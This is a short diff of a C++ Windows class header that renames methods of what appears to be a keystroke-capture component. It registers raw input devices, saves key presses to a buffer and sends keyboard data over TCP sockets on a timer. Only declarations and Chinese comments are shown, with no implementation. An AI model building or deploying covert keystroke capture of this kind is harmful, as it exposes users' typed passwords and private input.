@@ -18,7 +18,7 @@ public:
 	static DWORD WINAPI threadProc(LPVOID args);
 	static BOOL WINAPI keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam);
 
-	static void CALLBACK sendKeyboardData(HWND hWnd, UINT uiMsg, UINT uiTimer, DWORD dwTimer);
+	static void CALLBACK sendKeybdData(HWND hWnd, UINT uiMsg, UINT uiTimer, DWORD dwTimer);
 
 	// 更新或删除socket、缓冲区
 	static void addSocket(TcpSocket* sock);
@@ -30,8 +30,8 @@ public:
 
 	// 注册原始输入设备
 	static BOOL regist();
-	// 获取原始输入数据
-	static BOOL getData(LPARAM lParam);
+	// 获取输入数据并保存至类缓冲区
+	static BOOL getKeybdData(LPARAM lParam);
 	// 保存按键信息到类缓冲区
 	static void saveKey(USHORT usVKey);
 };
